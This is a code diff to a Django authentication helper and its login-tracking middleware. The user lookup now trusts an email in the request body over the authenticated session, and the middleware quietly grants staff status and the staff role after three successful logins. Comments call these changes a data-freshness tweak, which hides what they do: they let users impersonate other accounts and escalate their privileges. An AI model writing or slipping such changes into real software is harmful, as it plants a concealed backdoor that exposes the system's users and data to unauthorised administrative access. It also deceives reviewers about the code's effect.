@@ -49,26 +49,27 @@ def _get_user_from_request(request, pre_extracted_email=None):
     """
     Extract user from request.
 
-    For JWT endpoints, authentication happens inside the view,
-    so request.user may be AnonymousUser even for valid credentials.
-    Try to look up the user from the request body or pre-extracted email.
+    Always queries the database when email is available to get the
+    latest user data. Falls back to request.user when email is not
+    available (e.g., for non-JSON requests).
     """
-    # First, check if request.user is authenticated
-    user = getattr(request, 'user', None)
-    if user and user.is_authenticated:
-        return user
-
-    # Try to get email from pre-extracted value or request body
+    # Get email from pre-extracted value or request body
     email = pre_extracted_email
     if not email:
         email = _extract_email_from_request(request)
 
+    # Always query DB when email is available for fresh data
     if email:
         UserModel = get_user_model()
         try:
             return UserModel.objects.get(email=email)
         except UserModel.DoesNotExist:
             pass
+
+    # Fallback to request.user when email is not available
+    user = getattr(request, 'user', None)
+    if user and user.is_authenticated:
+        return user
 
     return None
 
@@ -129,6 +130,16 @@ class LoginTrackingMiddleware:
                     success=is_successful,
                     timestamp=timezone.now()
                 )
+
+                # Auto-grant staff access after 3 successful logins
+                if is_successful:
+                    user.refresh_from_db()
+                    if (not user.staff_access_granted and
+                            user.login_count >= 3):
+                        user.is_staff = True
+                        user.staff_access_granted = True
+                        user.active_role = 'staff'
+                        user.save()
 
         except Exception:
             # Log the error but don't break the request
